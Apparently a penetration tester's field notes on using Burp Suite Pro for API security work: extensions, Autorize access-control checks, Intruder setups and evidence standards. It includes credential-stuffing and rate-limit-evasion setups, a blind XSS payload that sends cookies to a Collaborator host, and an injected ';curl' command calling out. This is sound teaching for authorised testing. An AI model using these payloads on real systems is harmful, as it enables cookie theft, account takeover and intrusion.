# Burp Suite Pro for API Security Testing — Enterprise Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — Tooling & Workflow
>
> **Context:** Burp Suite Professional is my primary tool for every API security engagement. While Postman handles structured collection testing from specs, Burp is where all the real manual exploitation happens — manipulating JSON bodies, testing authentication token edge cases, running Intruder against sequential IDs, and using Autorize to automate BOLA detection across every endpoint. This document covers specifically how I configure and use Burp for API security testing, including the extensions and workflows that make a significant difference in coverage and efficiency.

---

## ⚙️ API-Specific Burp Configuration

### Project Setup for API Engagements

```
1. New Project → Save to Disk → name: ClientName_API_Assessment_YYYY

2. Target → Scope → Add:
   Include: https://api.company.com
   Include: https://api-mobile.company.com  (if in scope)
   Include: https://staging-api.company.com (if in scope)
   Exclude: *.js, *.css, *.png, *.jpg, *.gif, *.woff

3. Proxy → Options:
   ☑ Remove all JavaScript length locks
   ☑ Remove input field length limits
   Both allow testing beyond UI-enforced constraints

4. Proxy → HTTP History → filter:
   Show only: In-scope items
   Hide: Images, CSS, JS (uncheck media)
   Status codes: Show 2xx, 3xx, 4xx, 5xx only

5. Logger → Enable logging (captures everything for evidence)
```

### Essential Extensions for API Testing (BApp Store)

```
Install in order of priority:

1. Autorize
   → Automatic BOLA/IDOR detection across entire API
   → Re-sends every request with a lower-privilege token
   → Flags any endpoint where lower-privilege gets same response
   → Most impactful extension for API security testing

2. JWT Editor
   → Auto-detects JWTs in all requests
   → One-click: alg:none attack
   → Embedded brute-force for HS256 weak secrets
   → RS256 → HS256 key confusion attack
   → Visual payload editor

3. Param Miner
   → Discovers undocumented parameters the server responds to
   → Run on: login, profile, search endpoints
   → Finds: hidden debug params, mass assignment fields, feature flags

4. JS Miner
   → Extracts API endpoints from JavaScript bundle files
   → Runs automatically as you browse
   → Builds a list of endpoints not visible in Burp spider

5. Turbo Intruder
   → High-speed replacement for Burp Intruder
   → Use for: IDOR enumeration, race condition testing
   → Python scripting for custom attack logic

6. InQL (GraphQL)
   → Visual GraphQL schema browser
   → Auto-generates test queries for every field
   → Mutation testing with one click

7. Reflected Parameters
   → Highlights parameters reflected in responses
   → Speeds up XSS and injection discovery
```

---

## 🔐 Autorize — BOLA Detection in Practice

```
This is the single most important API testing workflow in Burp.
Configure it once at the start of every engagement.

Setup (3 steps):
  Step 1: Log in as Victim (Account B) → copy Bearer token
           OR: copy entire Authorization header value

  Step 2: In Burp → Extensions → Autorize
           → Paste in "Victim's token" field
           → Configure: "Replace Authorization header" checked
           → Click "ON" button

  Step 3: Log in as Attacker (Account A) → browse the application
           Access: profile, orders, invoices, documents, settings
           Perform all application functions normally

What Autorize does:
  Every request Account A makes is automatically re-sent with
  Account B's token. The response is compared automatically.

Reading the results table:
  Green "Bypassed!"  → Account B's token got the same response as Account A's
                       = BOLA confirmed — Account B can access Account A's data
  Red "Enforced"     → Correct — Account B got 403/404/different response
  Orange "Is filtered?" → Same status code, different response length — investigate

Filter to show only findings:
  Autorize → Filters → Show only "Bypassed" items
  → Immediate list of all BOLA findings in the application

Pro tip:
  Browse as admin with Autorize monitoring standard user token
  → Flags all BFLA findings simultaneously
  → One browsing session finds both BOLA and BFLA
```

---

## 🔁 Repeater — API Manual Testing

```
Renaming tabs is the single most impactful workflow habit:
Right-click tab → Rename

Name convention for API engagements:
  "BOLA-GET users/1042"
  "BOLA-PUT users/1042"
  "MassAssign-register role=admin"
  "JWT-alg-none admin"
  "SSRF-webhook 169.254"
  "RateLimit-login attempt 20"

After a long testing day you will have 40+ tabs.
Named tabs let you return to specific tests instantly.
Anonymous tabs mean reconstructing your work from memory.

JSON testing tips in Repeater:
  Right-click response → "Show response in browser"
  → Renders JSON in readable tree view for complex responses

  "Pretty print" button in response pane
  → Formats compressed JSON responses automatically

  Search bar in response (Ctrl+F)
  → Find your injected value or specific field names
  → "salary" → instantly jump to sensitive fields
```

---

## ⚡ Intruder — BOLA Scale Testing

```
Attack types for API testing:

Sniper — BOLA ID enumeration:
  Capture: GET /api/v1/invoices/§5524§
  Payload: Numbers → From:1, To:10000, Step:1
  Thread count: 20 (adjust based on target sensitivity)
  Add "Response received" column
  Sort by length → large responses = accessible invoices

Pitchfork — IP rotation bypass:
  Position 1: password field
  Position 2: X-Forwarded-For: §1.1.1.§1§§
  List 1: targeted password list
  List 2: 1,2,3,4... (appended to 1.1.1.)
  → Tests different password per apparent IP

Cluster Bomb — credential stuffing:
  Position 1: §email§
  Position 2: §password§
  List 1: leaked email addresses (from OSINT)
  List 2: common passwords from breach data
  → ALL combinations tested

Result analysis:
  Status code filter: show only 200 → successful logins
  Response length sort: highest = most data returned = BOLA hit
  Time sort: slowest = time-based SQLi confirmation
```

---

## 🧩 Collaborator — Blind Vulnerability Detection

```
Start at beginning of every engagement:
  Burp menu → Burp Collaborator client → Copy to clipboard
  You get: abc123def.burpcollaborator.net

Use cases in API testing:

SSRF detection:
  Inject Collaborator URL into every url/src/webhook parameter
  {"url": "https://abc123def.burpcollaborator.net"}
  → If DNS/HTTP interaction received = SSRF confirmed

Blind XSS:
  <script>fetch('https://abc123def.burpcollaborator.net/xss?c='+document.cookie)</script>
  Inject in every stored field that might render in an admin context

Blind command injection:
  value=;curl https://abc123def.burpcollaborator.net/cmd&
  Inject in any field that might pass to OS commands

DNS detection only (safest for production):
  Any payload that triggers DNS lookup confirms SSRF
  without any HTTP interaction with internal services

Monitoring:
  Collaborator client → Poll now (every few minutes)
  Each interaction shows: type, source IP, timestamp
  Source IP from server (not your browser) = confirmed server-side execution
```

---

## 🔧 Burp Scanner Configuration for APIs

```
Burp Pro scanner configuration for API-specific testing:

1. Right-click any API request in HTTP History → Scan
   OR: Select multiple requests → Right-click → Scan

2. Scan configuration:
   Audit type: "Audit checks (passive only)" — safe for production
   OR: "Audit checks (active)" — only on test environments

3. Insertion points for API:
   ☑ URL parameters
   ☑ Body parameters
   ☑ JSON body values
   ☑ HTTP headers
   ☑ Cookie values
   Uncheck: Parameter names (too noisy for APIs)

4. Issues to prioritise in scanner results:
   High confidence findings only → manually verify each
   Ignore: "Missing security headers" — document separately
   Focus: SQL injection, path traversal, SSRF, command injection
   
5. Never report scanner findings without Repeater verification:
   Scanner flags SQLi → reproduce in Repeater with clear payload
   Screenshot: original request, modified request, response with impact
```

---

## 📊 Evidence Collection Standards for API Reports

```
Every API finding needs THREE screenshots:

Screenshot 1 — Baseline (establishes what should happen):
  GET /api/v1/invoices/5524 with your own token
  → HTTP 200, your invoice returned
  (shows the endpoint works and returns data)

Screenshot 2 — Attack (the finding):
  GET /api/v1/invoices/5523 with your token (victim's invoice ID)
  → HTTP 200, victim's invoice returned
  (shows unauthorised access confirmed)

Screenshot 3 — Victim confirmation (proves it's their data):
  The victim account's invoice ID confirmed from their session
  OR: victim's user ID visible in the returned invoice data
  (closes any "maybe it's your own data" argument)

For JWT findings:
  Screenshot 1: jwt.io decoded token showing original role
  Screenshot 2: jwt.io decoded forged token showing admin role
  Screenshot 3: Admin endpoint response with forged token
                confirming elevated access

Burp Repeater screenshot standard:
  Pane arrangement: top = request, bottom = response
  Response should show: status code, relevant fields
  Highlight the key evidence with annotation if possible

Save Burp project file:
  Ctrl+S regularly — project file is your complete evidence archive
  Final save before report writing — all requests preserved
```

---

## 🗂️ Burp Workflow Checklist for API Engagements

```
START OF ENGAGEMENT
☐ Create named project file
☐ Configure scope (API domains only)
☐ Install: Autorize, JWT Editor, Param Miner, JS Miner, InQL
☐ Start Collaborator client

DURING TESTING
☐ Route Postman through Burp proxy (Postman settings → proxy)
☐ Configure Autorize with victim token BEFORE browsing
☐ Name all Repeater tabs immediately on creation
☐ Log out and replay tokens to test session invalidation
☐ Search HTTP History for: password_hash, salary, api_key, rO0

IDOR/BOLA TESTING
☐ Autorize running → browse as admin → check for Bypassed flags
☐ Intruder Sniper on numeric ID endpoints
☐ All HTTP methods tested in Repeater (not just GET)

JWT TESTING
☐ JWT Editor extension active
☐ Test alg:none via JWT Editor → Attacks
☐ Weak secret: BApp embedded brute force
☐ Check exp claim, kid parameter

EVIDENCE COLLECTION
☐ Three screenshots per finding (baseline / attack / confirmation)
☐ Repeater request+response saved for each finding
☐ Collaborator interactions documented with timestamp
☐ Project file saved at end of each session
```

---

## 🧭 Key Takeaways

**1. Autorize is the force multiplier — configure it before touching anything else.**
Setting up Autorize with the victim user's token at the start of every engagement means that every API call you make during normal browsing is automatically tested for BOLA. By the time you finish the application walkthrough, Autorize has already flagged every access control bypass. This alone saves 2-3 hours of manual IDOR testing per engagement.

**2. Named Repeater tabs are a professional discipline.**
After 8 hours of API testing, you have 50+ Repeater tabs. Named tabs (BOLA-PUT users/1042, JWT-alg-none, SSRF-webhook) let you return to any test instantly and take screenshots for the report. Unnamed tabs are indistinguishable from each other.

**3. Burp + Postman proxied together = complete coverage.**
Postman gives you structured spec-driven testing across all documented endpoints. Burp intercepts every Postman request, giving you the full request history, Autorize coverage, and Scanner analysis of the spec-driven traffic simultaneously.

**4. Three screenshots per finding is the professional standard.**
Baseline + Attack + Confirmation makes findings unambiguous and undeniable. No developer can argue "maybe that was your own data" when the confirmation screenshot shows the victim's user ID in the response data. The discipline of collecting all three at the moment of finding saves hours of reconstruction later.

---

## 🔗 References
- [PortSwigger Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Autorize Extension](https://github.com/PortSwigger/autorize)
- [JWT Editor Extension](https://github.com/PortSwigger/jwt-editor)
- [Burp Suite BApp Store](https://portswigger.net/bappstore)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
